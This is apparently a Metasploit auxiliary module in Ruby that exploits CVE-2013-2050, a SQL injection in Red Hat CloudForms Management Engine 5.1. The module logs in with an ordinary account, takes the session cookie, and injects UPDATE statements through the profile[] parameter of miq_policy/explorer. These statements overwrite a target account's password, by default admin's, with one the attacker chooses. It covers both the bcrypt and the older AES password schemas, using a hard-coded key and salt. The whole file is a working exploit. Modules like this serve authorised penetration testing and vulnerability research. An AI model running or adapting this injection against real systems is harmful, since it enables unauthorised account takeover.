##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'Red Hat CloudForms Management Engine 5.1 miq_policy/explorer SQL Injection',
      'Description'    => %q{
          This module exploits a SQL injection vulnerability in the "explorer"
        action of "miq_policy" controller of the Red Hat CloudForms Management
        Engine 5.1 (ManageIQ Enterprise Virtualization Manager 5.0 and earlier) by
        changing the password of the target account to the specified password.
      },
      'Author'         => 'Ramon de C Valle',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-2050'],
          ['CWE', '89'],
          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=959062']
        ],
      'DisclosureDate' => ''
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('USERNAME', [true, 'Your username']),
        OptString.new('PASSWORD', [true, 'Your password']),
        OptString.new('TARGETUSERNAME', [true, 'The username of the target account', 'admin']),
        OptString.new('TARGETPASSWORD', [true, 'The password of the target account', 'smartvm']),
        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST'] ])
      ], self.class
    )
  end

  def password_for_newer_schema
    # Newer versions use ActiveModel's SecurePassword.
    begin
      require 'bcrypt'

      BCrypt::Password.create(datastore['TARGETPASSWORD'])

    rescue LoadError
      print_error('Can\'t load "bcrypt" gem')
      print_status('Using "smartvm" as the password of the target account for this request...')
      '$2a$10$OHgj8h5MtsbmIAC9RPsrK.PH9t6Y.qGZxjHxUToKUJtFLJ0eY42/u'
    end
  end

  def password_for_older_schema
    # Older versions use ManageIQ's MiqPassword.
    if datastore['TARGETPASSWORD'].empty?
      'v1:{}'
    else
      password = '1234567890123456'
      salt = '6543210987654321'

      begin
        require 'ezcrypto'

        key = EzCrypto::Key.with_password(password, salt, :algorithm => 'AES-256-CBC')
        "v1:{#{key.encrypt64(datastore['TARGETPASSWORD']).strip}}"

      rescue LoadError
        require 'digest'
        require 'openssl'

        cipher = OpenSSL::Cipher.new('AES-256-CBC')
        cipher.encrypt
        cipher.key = Digest::SHA256.digest("#{salt}#{password}")[0...32]
        encrypted = cipher.update(datastore['TARGETPASSWORD']) + cipher.final
        "v1:{#{Rex::Text.encode_base64(encrypted)}}"
      end
    end
  end

  def password_reset?
    print_status("Trying to log into #{target_url('dashboard')} using the target account...")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),
      'vars_post' => {
        'user_name'     => datastore['TARGETUSERNAME'],
        'user_password' => datastore['TARGETPASSWORD']
      }
    )

    if res.nil?
      print_error('No response from remote host')
      return false
    end

    if res.body =~ /"Error: (.*)"/
      print_error($1)
      false
    else
      true
    end
  end

  def run
    print_status("Logging into #{target_url('dashboard')}...")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),
      'vars_post' => {
        'user_name'     => datastore['USERNAME'],
        'user_password' => datastore['PASSWORD']
      }
    )

    if res.nil?
      print_error('No response from remote host')
      return
    end

    if res.body =~ /"Error: (.*)"/
      print_error($1)
      return
    else
      session = $1 if res.headers['Set-Cookie'] =~ /_vmdb_session=(\h*)/

      if session.nil?
        print_error('Failed to retrieve the current session id')
        return
      end
    end

    # Newer versions don't accept POST requests.
    print_status("Sending password-reset request to #{target_url('miq_policy', 'explorer')}...")
    send_request_cgi(
      'cookie'   => "_vmdb_session=#{session}",
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),
      'vars_get' => {
        'profile[]' => value_for_newer_schema
      }
    )

    if password_reset?
      print_good('Password reset successfully')
      return
    else
      print_error('Failed to reset password')
    end

    print_status("Sending (older-schema) password-reset request to #{target_url('miq_policy', 'explorer')}...")
    send_request_cgi(
      'cookie' => "_vmdb_session=#{session}",
      'method' => datastore['HTTP_METHOD'],
      'uri'    => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),
      "vars_#{datastore['HTTP_METHOD'].downcase}" => {
        'profile[]' => value_for_older_schema
      }
    )

    if password_reset?
      print_good('Password reset successfully')
    else
      print_error('Failed to reset password')
    end
  end

  def target_url(*args)
    (ssl ? 'https' : 'http') +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end

  def value_for_newer_schema
    "1 = 1); UPDATE users SET password_digest = '#{password_for_newer_schema}' WHERE userid = '#{datastore['TARGETUSERNAME']}' --"
  end

  def value_for_older_schema
    "1 = 1); UPDATE users SET password = '#{password_for_older_schema}' WHERE userid = '#{datastore['TARGETUSERNAME']}' --"
  end
end
